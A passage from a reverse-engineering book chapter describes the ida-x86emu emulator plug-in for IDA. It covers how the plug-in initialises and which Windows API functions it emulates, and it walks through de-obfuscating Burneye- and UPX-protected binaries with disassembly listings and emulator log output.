a minimum, an emulator requires a stream of instruction bytes and sufficient memory to dedicate to stack operations and CPU registers. More sophisticated emulators may provide access to emulated hardware devices and operating system services.</p><p>IDA does not offer a native emulation facility,<sup>[<a class="footnote" href="#ftn.CHP-21-FN-34" id="CHP-21-FN-34">182</a>]</sup> but its plug-in architecture is sophisticated enough to allow for the creation of emulator-type plug-ins. One possible implementation of such an emulator treats the IDA database as virtual memory that happens to contain the mapped binary we wish to emulate (courtesy of a loader module). All that is required of an emulator plug-in is to provide a small amount of memory to track the state of all CPU registers and some means to implement a stack. One approach implements a stack by creating a new segment within the database mapped to a location suitable for a stack. The emulator operates by reading bytes from the database location specified by the current value of the the emulator’s instruction pointer, decoding the retrieved values according to the emulated CPU’s instruction set specification, and updating any memory values affected by the decoded instruction. Possible updates might include modifying emulated register values, storing values into the emulated stack memory space, or patching modified values into the data or code sections within the IDA database as dictated by memory addresses generated by the decoded instruction. Control of the emulator could be similar to control of a debugger in that instructions could be stepped through, memory could be examined, registers could be modified, and breakpoints could be set. Memory contents within the program memory space would be displayed courtesy of IDA’s disassembly and hex views, while the emulator would be required to generate its own displays for the CPU registers.<a class="indexterm" id="IDX-CHP-21-0173"/><a class="indexterm" id="IDX-CHP-21-0174"/><a class="indexterm" id="IDX-CHP-21-0175"/><a class="indexterm" id="IDX-CHP-21-0176"/></p><p>Using such an emulator, an obfuscated program may be de-obfuscated by initiating emulation at the program entry point and stepping through the instructions that constitute the de-obfuscation phase of the program. Because the emulator utilizes the database as its backing memory, all self-modifications are reflected immediately as changes in the database. By the time the de-obfuscation routine has completed, the database has been transformed into the correct de-obfuscated version of the program, just as if the program had been running under debugger control. An immediate advantage of emulation over debugging is that potentially malicious code is never actually executed by an emulator, whereas debugger-assisted de-obfuscation must allow at least some portion of the malicious program to execute in order to obtain the de-obfuscated version of the program.</p><p>The ida-x86emu (x86emu) plug-in is an example of an emulator plug-in that is designed to offer emulation of the x86 instruction set. The plug-in is open source and builds with all versions of the IDA SDK from 4.9 onward. Binary versions of the plug-in compiled for all versions of IDA are included with the x86emu distribution. The plug-in is designed for use with either the Windows GUI version or the Qt version of IDA and includes build scripts, which allow the plug-in to be built using either MinGW (g++/make) or Microsoft (Visual Studio 2008) tools. The Qt version of the plug-in is also compatible with the Linux and OS X versions of IDA. Other than the appropriate SDK for your version of IDA, the plug-in has no other dependencies. The plug-in is installed by copying the compiled plug-in binary (<span class="emphasis"><em>x86emu.plw/x86emu_qt.plw</em></span>) into <span class="emphasis"><em>&lt;IDADIR&gt;/plugins</em></span>.<a class="indexterm" id="IDX-CHP-21-0177"/></p><p>No plug-in configuration is required, and the emulator is activated using the <span class="keycap">alt</span>-F8 key sequence by default. The plug-in may be activated only for binaries that make use of the x86 processor, and the plug-in may be used with binaries of any file type, such as PE, ELF, and Mach-O. The plug-in may be built from source using the tools (Visual Studio or MinGW’s gcc and make) discussed in <a class="xref" href="ch17.html" title="Chapter 17. The IDA Plug-in Architecture">Chapter 17</a>.</p><div class="informaltable"><table style="border-collapse: collapse;border-top: 0.5pt solid ; border-bottom: 0.5pt solid ; border-left: 0.5pt solid ; border-right: 0.5pt solid ; "><colgroup><col/><col/></colgroup><tbody><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Name</strong></span></p></td><td style="text-align: left" valign="top"><p>ida-x86emu</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Author</strong></span></p></td><td style="text-align: left" valign="top"><p>Chris Eagle</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Distribution</strong></span></p></td><td style="text-align: left" valign="top"><p>Source for SDK v6.1 and binaries for all versions of IDA from 5.0, including IDA Freeware. Source is backward compatible to SDK version 4.9.</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Price</strong></span></p></td><td style="text-align: left" valign="top"><p>Free</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Description</strong></span></p></td><td style="text-align: left" valign="top"><p>Embedded x86 instruction emulator for IDA</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Information</strong></span></p></td><td style="text-align: left" valign="top"><p><a class="ulink" href="http://www.idabook.com/ida-x86emu">http://www.idabook.com/ida-x86emu</a></p></td></tr></tbody></table></div><div class="sect3" title="x86emu Initialization"><div class="titlepage"><div><div><h3 class="title"><a id="x86emu_initialization"/>x86emu Initialization</h3></div></div></div><p>When the x86emu plug-in is activated, the plug-in control dialog shown in <a class="xref" href="ch21s03.html#x86emu_emulator_control_dialog" title="Figure 21-4. x86emu emulator control dialog">Figure 21-4</a> is displayed. The basic display shows register values and provides button controls used to perform simple emulation tasks such as stepping the emulator or modifying data values.<a class="indexterm" id="IDX-CHP-21-0178"/><a class="indexterm" id="IDX-CHP-21-0179"/><a class="indexterm" id="IDX-CHP-21-0180"/><a class="indexterm" id="IDX-CHP-21-0181"/><a class="indexterm" id="IDX-CHP-21-0182"/><a class="indexterm" id="IDX-CHP-21-0183"/><a class="indexterm" id="IDX-CHP-21-0184"/><a class="indexterm" id="IDX-CHP-21-0185"/><a class="indexterm" id="IDX-CHP-21-0186"/><a class="indexterm" id="IDX-CHP-21-0187"/><a class="indexterm" id="IDX-CHP-21-0188"/><a class="indexterm" id="IDX-CHP-21-0189"/><a class="indexterm" id="IDX-CHP-21-0190"/></p><div class="figure"><a id="x86emu_emulator_control_dialog"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject2_d1e37383"/><img alt="x86emu emulator control dialog" src="httpatomoreillycomsourcenostarchimages854324.png.jpg"/></div></div><p class="title">Figure 21-4. x86emu emulator control dialog</p></div><p>Upon initial activation, the plug-in carries out a number of additional actions. For all file types, the emulator creates new database segments named <code class="literal">.stack</code> and <code class="literal">.heap</code> in order to provide runtime memory support for emulated program operations. The first time the plug-in is activated within a particular binary, the current cursor location is used to initialize the instruction pointer (<code class="literal">EIP</code>). For Windows PE binaries, the plug-in performs the following additional tasks:</p><div class="orderedlist"><ol class="orderedlist"><li class="listitem"><p>Creates an additional program segment named <code class="literal">.headers</code>, rereads the input binary file, and then loads the MS-DOS and PE header bytes into the database.</p></li><li class="listitem"><p>Allocates memory to emulate a thread environment block (TEB) and a process environment block (PEB). These structures are populated with reasonable values in an attempt to convince the program being emulated that it is running within an actual Windows environment.<a class="indexterm" id="IDX-CHP-21-0191"/><a class="indexterm" id="IDX-CHP-21-0192"/></p></li><li class="listitem"><p>Assigns reasonable values to the x86 segment registers and configures a fake interrupt descriptor table in order to provide a minimal exception-handling capability.<a class="indexterm" id="IDX-CHP-21-0193"/></p></li><li class="listitem"><p>Attempts to locate all DLLs referenced in the PE file’s import directory. For each such DLL that is found, the emulator creates additional segments within the database and loads the DLL’s headers and export directory. The binary’s import table is then populated with function addresses derived from the loaded DLL information. Note that no code from any of the imported DLLs is loaded into the database.</p></li></ol></div><p>The current state of the plug-in (register values) is saved in a netnode each time the database is saved or closed. Additional memory state such as stack and heap values is saved as well because these values are stored within dedicated segments in the database. Upon subsequent activation, the emulator state is restored from existing netnode data.</p></div><div class="sect3" title="Basic x86emu Operation"><div class="titlepage"><div><div><h3 class="title"><a id="basic_x86emu_operation"/>Basic x86emu Operation</h3></div></div></div><p>The emulator control dialog is intended to provide capabilities similar to those of a very basic debugger. CPU register contents may be altered by entering a new value into the desired register’s edit box.<a class="indexterm" id="IDX-CHP-21-0194"/><a class="indexterm" id="IDX-CHP-21-0195"/><a class="indexterm" id="IDX-CHP-21-0196"/><a class="indexterm" id="IDX-CHP-21-0197"/><a class="indexterm" id="IDX-CHP-21-0198"/><a class="indexterm" id="IDX-CHP-21-0199"/><a class="indexterm" id="IDX-CHP-21-0200"/><a class="indexterm" id="IDX-CHP-21-0201"/><a class="indexterm" id="IDX-CHP-21-0202"/><a class="indexterm" id="IDX-CHP-21-0203"/><a class="indexterm" id="IDX-CHP-21-0204"/><a class="indexterm" id="IDX-CHP-21-0205"/></p><p>The Step button is used to emulate a single instruction. A single instruction is emulated by reading one or more bytes from the database location specified by the EIP register and carrying out any actions specified by the instruction bytes. Where required, register display values are updated to reflect changes resulting from the emulation of the current instruction. Each time the Step button is clicked, the emulator ensures that the bytes at the address specified by EIP are displayed as code (rather than data). This feature helps defeat any desynchronization attempts that may occur within the instruction stream. In addition, the emulator jumps the disassembly display window to the location specified by EIP so that the display tracks along with each emulated instruction.</p><p>The Run To Cursor button may be used to emulate an entire sequence of instructions at one time. Emulation continues from the current EIP location and does not stop until a breakpoint is reached or EIP is equal to the current cursor location. The emulator recognizes breakpoints set via IDA’s debugger interface (right-click the desired address and select <span class="strong"><strong>Add breakpoint</strong></span>) or breakpoints set via the emulator’s own breakpoint interface, Emulate ▸ Set Breakpoint.</p><div class="sidebar"><a id="x86emu_breakpoints"/><p class="title">x86EMU BREAKPOINTS</p><p>The emulator does not make use of hardware debug registers or software interrupts such as the <code class="literal">int 3</code> instruction. Instead, the emulator maintains an internal list of breakpoints against which the emulated instruction pointer is compared prior to emulating each instruction. While this may seem inefficient, it is no more inefficient than emulation in general, and it offers the advantage that emulator breakpoints are undetectable, and unalterable, by the program being emulated.</p></div><p>Once Run To Cursor has been selected, the emulator does not pause to reformat the disassembly for each fetched instruction; instead it formats only the first and last instructions executed. For long instruction sequences, the overhead associated with reformatting the disassembly at each instruction would result in intolerably slow performance of the emulator. You should use the Run To Cursor command very carefully, as control of the emulator (and IDA) will not be regained until EIP reaches the cursor location. If, for any reason, execution never hits a breakpoint or fails to reach the cursor location, you may be required to forcibly terminate IDA, potentially losing valuable work.</p><p>The Skip button is used to advance the emulator by exactly one instruction without emulating that instruction. One potential use of the Skip command is to skip over a conditional jump in order to reach a specific block of code regardless of the state of any condition flags. Skip is also useful for skipping over calls to imported library functions whose code is not available for emulation. Should you elect to skip over a function call, make certain that you update the database to reflect any changes that the function would have made. Examples of such changes include modifying the value of EAX to reflect the desired function return value or populating a buffer whose address was passed to the function. Additionally, if the skipped function uses the <code class="literal">stdcall</code> calling convention, you should also be careful to manually adjust ESP according to the number of bytes that the skipped function would have cleared from the stack upon return.<a class="indexterm" id="IDX-CHP-21-0206"/><a class="indexterm" id="IDX-CHP-21-0207"/><a class="indexterm" id="IDX-CHP-21-0208"/><a class="indexterm" id="IDX-CHP-21-0209"/><a class="indexterm" id="IDX-CHP-21-0210"/><a class="indexterm" id="IDX-CHP-21-0211"/><a class="indexterm" id="IDX-CHP-21-0212"/><a class="indexterm" id="IDX-CHP-21-0213"/><a class="indexterm" id="IDX-CHP-21-0214"/><a class="indexterm" id="IDX-CHP-21-0215"/><a class="indexterm" id="IDX-CHP-21-0216"/></p><p>The Jump To Cursor button causes EIP to be updated with the address of the current cursor location. This feature may be used to skip entire sections of code or to follow a conditional jump when the state of the CPU flags may not cause the jump to be taken otherwise. Keep in mind that jumping around within a function may have consequences on stack layout (if you skip over a push or stack pointer adjustment, for example), resulting in unexpected behaviors. Note that it is not necessarily the intention of the emulator that emulation begins with the entry point of a program. It is entirely possible to use the emulator to emulate a single function within a binary in order to study the behavior of that function. This is one of the motivations behind the inclusion of the Jump to Cursor button, to allow easy redirection of your emulation efforts within a binary.</p><p>The Run button is similar in functionality to the Run To Cursor button; however, it is more dangerous in that execution continues until a breakpoint is reached. You should be absolutely certain that one of your break-points will be reached if you elect to use this command.</p><p>The Segments button provides access to configuration for x86 segment registers and segment base addresses. <a class="xref" href="ch21s03.html#x86emu_segment_register_configuration" title="Figure 21-5. x86emu segment register configuration">Figure 21-5</a> shows the resulting dialog used to alter segment-related values.</p><div class="figure"><a id="x86emu_segment_register_configuration"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject2_d1e37563"/><img alt="x86emu segment register configuration" src="httpatomoreillycomsourcenostarchimages854327.png.jpg"/></div></div><p class="title">Figure 21-5. x86emu segment register configuration</p></div><p>While the emulator’s address computations honor the supplied base values, the emulator does not currently provide a complete emulation of the x86 global descriptor table (GDT).</p><p>The Set Memory button provides access to a basic memory modification dialog, as shown in <a class="xref" href="ch21s03.html#x86emu_memory_modification_dialog" title="Figure 21-6. x86emu memory modification dialog">Figure 21-6</a>.</p><div class="figure"><a id="x86emu_memory_modification_dialog"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject2_d1e37578"/><img alt="x86emu memory modification dialog" src="httpatomoreillycomsourcenostarchimages854330.png.jpg"/></div></div><p class="title">Figure 21-6. x86emu memory modification dialog</p></div><p>This dialog is essentially a wrapper around some of the SDK <code class="literal">Patch</code><em class="replaceable"><code>XXX</code></em> functions. The type of data to be inserted into the database is selected via the provided radio buttons, while the actual data is entered into the provided edit control. If the Load from file radio button is selected, the user is presented with a standard file-open dialog to select a file whose content is transferred into the database beginning at the specified address.<a class="indexterm" id="IDX-CHP-21-0217"/><a class="indexterm" id="IDX-CHP-21-0218"/><a class="indexterm" id="IDX-CHP-21-0219"/><a class="indexterm" id="IDX-CHP-21-0220"/><a class="indexterm" id="IDX-CHP-21-0221"/><a class="indexterm" id="IDX-CHP-21-0222"/><a class="indexterm" id="IDX-CHP-21-0223"/><a class="indexterm" id="IDX-CHP-21-0224"/><a class="indexterm" id="IDX-CHP-21-0225"/><a class="indexterm" id="IDX-CHP-21-0226"/><a class="indexterm" id="IDX-CHP-21-0227"/><a class="indexterm" id="IDX-CHP-21-0228"/></p><p>The Push Data button is used to place data values onto the top of the emulated program stack. The resulting dialog, shown in <a class="xref" href="ch21s03.html#x86emu_stack_data_dialog" title="Figure 21-7. x86emu stack data dialog">Figure 21-7</a>, may be used to specify one or more data items that will be pushed onto the stack.</p><div class="figure"><a id="x86emu_stack_data_dialog"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject2_d1e37646"/><img alt="x86emu stack data dialog" src="httpatomoreillycomsourcenostarchimages854333.png.jpg"/></div></div><p class="title">Figure 21-7. x86emu stack data dialog</p></div><p>The emulator currently accepts only numeric data. Supplied values are pushed, as 4-byte quantities, onto the emulation stack in right-to-left order as if they were parameters to a function call. The value of the stack pointer is adjusted according to the number of values pushed onto the stack. The intended use of this dialog is to configure function parameters prior to jumping directly to the function to be emulated. This allows a function to be emulated without requiring users to find an actual execution path to the function.</p></div><div class="sect3" title="Emulator-Assisted De-obfuscation"><div class="titlepage"><div><div><h3 class="title"><a id="emulator-assisted_de-obfuscation"/>Emulator-Assisted De-obfuscation</h3></div></div></div><p>At this point we are ready to discuss the use of x86emu as a de-obfuscation tool. We begin by returning to the Burneye example for which we developed an entire IDC script. Assuming that we have no prior knowledge of the Burn-eye decoding algorithm, de-obfuscation would proceed as follows.</p><div class="orderedlist"><ol class="orderedlist"><li class="listitem"><p>Open the Burneye protected binary. The cursor should be automatically positioned at the <code class="literal">start</code> entry point. Activate the emulator (<span class="keycap">alt</span>-F8). <a class="xref" href="ch21s03.html#x86emu_emulator_control_dialog" title="Figure 21-4. x86emu emulator control dialog">Figure 21-4</a> shows the resulting state of the emulator.</p></li><li class="listitem"><p>Begin stepping the emulator, paying close attention to the instructions that are about to be emulated. After six steps, the emulator arrives at function <code class="literal">sub_5371048</code> (see <a class="xref" href="ch21s03.html#main_burneye_decoding_function" title="Example 21-3. Main Burneye decoding function">Example 21-3</a>).<a class="indexterm" id="IDX-CHP-21-0229"/><a class="indexterm" id="IDX-CHP-21-0230"/><a class="indexterm" id="IDX-CHP-21-0231"/><a class="indexterm" id="IDX-CHP-21-0232"/></p></li><li class="listitem"><p>This function appears to be fairly well structured. We could choose to step the emulator for a while to obtain a better sense of the flow of execution, or we could choose to study the function for a while and determine if it is safe to position the cursor at the function’s <code class="literal">return</code> statement and click Run To Cursor. Opting for the latter, we position the cursor at address <code class="literal">05371081h</code> and click <span class="strong"><strong>Run To Cursor</strong></span>.</p></li><li class="listitem"><p>At this point the de-obfuscation is complete. Stepping the emulator two more times executes the <code class="literal">return</code> statement, returning the the newly de-obfuscated code, and causes IDA to reformat the de-obfuscated bytes as instructions.</p></li></ol></div><p>The resulting de-obfuscated code is shown here:</p><a id="I_programlisting2_d1e37714"/><pre class="programlisting">LOAD:05371082 loc_5371082:                ; CODE XREF: start+E↑j
  LOAD:05371082                 call    sub_5371048
  LOAD:05371082 ; --------------------------------------------------------------
  LOAD:05371087                 db    0
  LOAD:05371088                 db    0
  LOAD:05371089                 db    0
  LOAD:0537108A                 db    0
  LOAD:0537108B                 db    0
  LOAD:0537108C                 db    0
  LOAD:0537108D                 db    0
  LOAD:0537108E                 db    0
  LOAD:0537108F                 db    0
  LOAD:05371090 ; --------------------------------------------------------------
  LOAD:05371090
  LOAD:05371090 loc_5371090:                ; DATA XREF: LOAD:off_5371008↑o
<img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/> LOAD:05371090                 pushf
  LOAD:05371091                 pop     ebx
  LOAD:05371092                 mov     esi, esp
  LOAD:05371094                 call    sub_5371117
  LOAD:05371099                 mov     ebp, edx
  LOAD:0537109B                 cmp     ecx, 20h
  LOAD:0537109E                 jl      loc_53710AB
  LOAD:053710A4                 xor     eax, eax
  LOAD:053710A6                 jmp     loc_53710B5</pre><p>Comparing this listing to that of <a class="xref" href="ch21s03.html#burneye_startup_sequence_and_obfuscated" title="Example 21-2. Burneye startup sequence and obfuscated code">Example 21-2</a>, it is clear that the instructions have changed as a result of the de-obfuscation process. Following the initial de-obfuscation, execution of the program resumes with the <code class="literal">pushf</code> instruction <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e37729"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span> at <code class="literal">loc_5371090</code>.</p><p>Emulator-assisted de-obfuscation is clearly easier than the script-oriented de-obfuscation process followed earlier. Time spent developing the emulator approach pays off with a highly flexible de-obfuscation alternative, whereas time spent developing a Burneye-specific script pays off in a very specialized script that is of little use in other de-obfuscation scenarios.</p><p>Note that while the Burneye-protected binary in the previous example was a Linux ELF binary, x86emu has no problems emulating the instructions within the binary because they are all x86 instructions, regardless of the operating system and file type that they were taken from. x86emu can be used just as easily on a Windows PE binary, such as the UPX example discussed earlier in this chapter. Because of the fact that the overwhelming majority of obfuscated malware in existence today is targeted at the Windows platform, x86emu contains many features specific to Windows PE binaries (as detailed earlier).<a class="indexterm" id="IDX-CHP-21-0233"/><a class="indexterm" id="IDX-CHP-21-0234"/><a class="indexterm" id="IDX-CHP-21-0235"/><a class="indexterm" id="IDX-CHP-21-0236"/><a class="indexterm" id="IDX-CHP-21-0237"/><a class="indexterm" id="IDX-CHP-21-0238"/><a class="indexterm" id="IDX-CHP-21-0239"/><a class="indexterm" id="IDX-CHP-21-0240"/></p><p>Using the emulator to uncompress a UPX binary is very straightforward. The emulator should be launched with the cursor positioned on the program entry point (<code class="literal">start</code>). Next, the cursor can be moved to the first instruction of the UPX import table, rebuilding loops (address <code class="literal">0040886Ch</code> in <a class="xref" href="ch21.html#import_table_reconstruction_in_upx" title="Example 21-1. Import table reconstruction in UPX">Example 21-1</a>), and the emulator can be allowed to run using the Run To Cursor command. At this point, the binary has been unpacked, and the Strings window can be used to view all of the unpacked library and function names that will be used by UPX to build the program’s import tables. If the emulator is stepped through the code of <a class="xref" href="ch21.html#import_table_reconstruction_in_upx" title="Example 21-1. Import table reconstruction in UPX">Example 21-1</a>, the following function call will eventually be encountered:</p><a id="I_programlisting2_d1e37782"/><pre class="programlisting">UPX1:00408882                 call    dword ptr [esi+808Ch]</pre><p>Instructions of this sort can be dangerous to emulate, as it is not immediately apparent where the instruction may lead (meaning that the destination address of the <code class="literal">call</code> instruction is not obvious). In general, function calls can lead to one of two places: a function within the program’s code (<code class="literal">.text</code>) segment or a function within a shared library being used by the program. Whenever a <code class="literal">call</code> instruction is encountered, the emulator determines whether the target address lies within the virtual address space of the file being analyzed or whether the target address correlates to a function that is being exported by one of the libraries that the binary has loaded. Recall that for PE binaries the emulator loads the export dictionaries of all libraries loaded by the binary being analyzed. When the emulator determines that the target address of a call instruction lies outside the bounds of the binary, the emulator scans the export tables that were loaded into the database in order to determine which library function is being called. For Windows PE files, the emulator contains emulated implementations of the functions listed in <a class="xref" href="ch21s03.html#functions_emulated_by_x86emu" title="Table 21-1. Functions Emulated by x86emu">Table 21-1</a>.</p><p>When the emulator determines that one of these functions has been called, it reads any parameters from the program stack and either carries out the same actions that the actual function would carry out if the program were actually running or performs some minimal action and generates a return value that will appear to be correct from the perspective of the emulated program. In the case of <code class="literal">stdcall</code> functions, the emulator properly removes any stack arguments prior to completing the emulated function.</p><div class="table"><a id="functions_emulated_by_x86emu"/><p class="title">Table 21-1. Functions Emulated by x86emu</p><div class="table-contents"><table style="border-collapse: collapse;border-top: 0.5pt solid ; border-bottom: 0.5pt solid ; border-left: 0.5pt solid ; border-right: 0.5pt solid ; " summary="Functions Emulated by x86emu"><colgroup><col/><col/><col/><col/></colgroup><tbody><tr><td style="text-align: left" valign="top"><p><code class="literal">CheckRemoteDebuggerPresent</code><a class="indexterm" id="IDX-CHP-21-0241"/><a class="indexterm" id="IDX-CHP-21-0242"/><a class="indexterm" id="IDX-CHP-21-0243"/><a class="indexterm" id="IDX-CHP-21-0244"/><a class="indexterm" id="IDX-CHP-21-0245"/><a class="indexterm" id="IDX-CHP-21-0246"/></p></td><td style="text-align: left" valign="top"><p><code class="literal">GetTickCount</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">LocalFree</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">VirtualAlloc</code></p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">CreateThread</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">GetVersion</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">NtQuerySystemInformation</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">VirtualFree</code></p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">GetCurrentThreadId</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">HeapAlloc</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">NtQueryInformationProcess</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">calloc</code></p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">GetCurrentProcess</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">HeapCreate</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">NtSetInformationThread</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">free</code></p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">GetCurrentProcessId</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">HeapDestroy</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">RtlAllocateHeap</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">lstrcat</code></p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">GetModuleHandleA</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">HeapFree</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">TlsAlloc</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">lstrcpy</code></p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">GetProcAddress</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">IsDebuggerPresent</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">TlsFree</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">lstrlen</code></p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">GetProcessHeap</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">LoadLibraryA</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">TlsGetValue</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">malloc</code></p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">GetThreadContext</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">LocalAlloc</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">TlsSetValue</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">realloc</code></p></td></tr></tbody></table></div></div><p>Emulated behavior for the heap-related functions causes the emulator to manipulate its internal heap implementation (backed by the <code class="literal">.heap</code> section) and return a value appropriate to the function being emulated. For example, the value returned by the emulated version of <code class="literal">HeapAlloc</code> is an address that is suitable for the emulated program to write data to. When the emulated version of <code class="literal">VirtualAlloc</code> is called, a new section is created in the database to represent the newly mapped virtual address space. The emulated version of <code class="literal">IsDebuggerPresent</code> always returns false. When emulating <code class="literal">LoadLibraryA</code>, the emulator extracts the name of the library being loaded by examining the stack arguments provided to <code class="literal">LoadLibraryA</code>. The emulator then attempts to open the named library on the local system so that library’s export table can be loaded into the database, and an appropriate library handle<sup>[<a class="footnote" href="#ftn.CHP-21-FN-35" id="CHP-21-FN-35">183</a>]</sup> value is returned to the caller. When a call to <code class="literal">GetProcAddress</code> is intercepted, the emulator examines arguments on the stack to determine which shared library is being referenced; then the emulator parses the library’s export table in order to compute the proper memory address of the requested function, which is then returned to the caller. Calls to <code class="literal">LoadLibraryA</code> and <code class="literal">GetProcAddress</code> are noted in the IDA Output window.<a class="indexterm" id="IDX-CHP-21-0247"/><a class="indexterm" id="IDX-CHP-21-0248"/><a class="indexterm" id="IDX-CHP-21-0249"/></p><p>When a function for which x86emu has no internal emulation is called, a dialog similar to the one shown in <a class="xref" href="ch21s03.html#x86emu_library_function_dialog" title="Figure 21-8. x86emu library function dialog">Figure 21-8</a> is displayed.</p><p>Knowing the name of the function being called, the emulator queries IDA’s type library information to obtain the number and types of parameters required by the function. The emulator then digs into the program stack to display all of the arguments that have been passed to the function, along with the type of the argument and the formal parameter name of the argument. Argument types and names are displayed only when type information is available from IDA. The dialog also offers the user a chance to specify a return value, as well as the opportunity to specify the calling convention used by the function (this information may be available from IDA). When the <code class="literal">stdcall</code> calling convention is selected, the user should indicate how many arguments (not bytes) should be removed from the stack when the call completes. This information is required in order for the emulator to maintain the integrity of the execution stack across emulated function calls.</p><div class="figure"><a id="x86emu_library_function_dialog"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject2_d1e38042"/><img alt="x86emu library function dialog" src="httpatomoreillycomsourcenostarchimages854336.png.jpg"/></div></div><p class="title">Figure 21-8. x86emu library function dialog</p></div><p>Returning to the UPX de-obfuscation example, and allowing the emulator to complete the import table reconstruction loops, we would find that the emulator generates output such as the following in IDA’s Output window:<a class="indexterm" id="IDX-CHP-21-0250"/><a class="indexterm" id="IDX-CHP-21-0251"/></p><a id="I_programlisting2_d1e38055"/><pre class="programlisting">x86emu: LoadLibrary called: KERNEL32.DLL (7C800000)
x86emu: GetProcAddress called: ExitProcess (0x7C81CDDA)
x86emu: GetProcAddress called: ExitThread (0x7C80C058)
x86emu: GetProcAddress called: GetCurrentProcess (0x7C80DDF5)
x86emu: GetProcAddress called: GetCurrentThread (0x7C8098EB)
x86emu: GetProcAddress called: GetFileSize (0x7C810A77)
x86emu: GetProcAddress called: GetModuleHandleA (0x7C80B6A1)
x86emu: GetProcAddress called: CloseHandle (0x7C809B47)</pre><p>This output provides a record of the libraries that the obfuscated binary is loading and the functions within those libraries that the obfuscated program is resolving.<sup>[<a class="footnote" href="#ftn.CHP-21-FN-36" id="CHP-21-FN-36">184</a>]</sup> When function addresses are looked up in this manner, they are often saved in an array (this array is the program’s import table) for later use.</p><p>A fundamental problem with de-obfuscated programs is that they lack the symbol table information that is usually present in un-obfuscated binaries. When a binary’s import table is intact, IDA’s PE loader names each entry in the import table according to the name of the functions whose address it will contain at runtime. When an obfuscated binary is encountered, it is useful to apply function names to each location in which a function address is stored. In the case of UPX, the following lines from <a class="xref" href="ch21.html#import_table_reconstruction_in_upx" title="Example 21-1. Import table reconstruction in UPX">Example 21-1</a> show how function addresses are saved into memory with each pass through the function lookup loop:</p><a id="I_programlisting2_d1e38070"/><pre class="programlisting">UPX1:00408897        call    dword ptr [esi+8090h] ; GetProcAddress
  UPX1:0040889D        or      eax, eax
  UPX1:0040889F        jz      short loc_4088A8
<img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/> UPX1:004088A1        mov     [ebx], eax            ; Save to import table
  UPX1:004088A3        add     ebx, 4</pre><p>The instruction at address <code class="literal">004088A1h</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e38084"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span> is responsible for storing function addresses into the import table as it is reconstructed. x86emu provides an automated facility for naming each import table entry provided that an instruction such as this can be identified. The emulator terms such an instruction an <span class="emphasis"><em>import address save point</em></span>, and you may designate an address as such using the Emulate ▸ Windows ▸ Set Import Address Save Point menu option. This designation must be made before the instruction is emulated in order for this functionality to work. Following designation, each time the instruction is emulated, the emulator will perform a lookup to determine what function is referenced by the data being written and then name the address being written using the name of the imported function. In the UPX example, making no effort to clean up the import table would yield the (partial) import table shown here:<a class="indexterm" id="IDX-CHP-21-0252"/><a class="indexterm" id="IDX-CHP-21-0253"/><a class="indexterm" id="IDX-CHP-21-0254"/><a class="indexterm" id="IDX-CHP-21-0255"/><a class="indexterm" id="IDX-CHP-21-0256"/><a class="indexterm" id="IDX-CHP-21-0257"/></p><a id="I_programlisting2_d1e38124"/><pre class="programlisting">UPX0:00406270                 dd 7C81CDDAh
UPX0:00406274                 dd 7C80C058h
UPX0:00406278                 dd 7C80DDF5h
UPX0:0040627C                 dd 7C8098EBh</pre><p>However, the automated naming that is performed when an import address save point is designated yields the following automatically generated (partial) import table.</p><a id="I_programlisting2_d1e38128"/><pre class="programlisting">UPX0:00406270 ; void __stdcall ExitProcess(UINT uExitCode)
UPX0:00406270 ExitProcess     dd 7C81CDDAh        ; DATA XREF: j_ExitProcess↑r
UPX0:00406274 ; void __stdcall ExitThread(DWORD dwExitCode)
UPX0:00406274 ExitThread      dd 7C80C058h        ; DATA XREF: j_ExitThread↑r
UPX0:00406278 ; HANDLE __stdcall GetCurrentProcess()
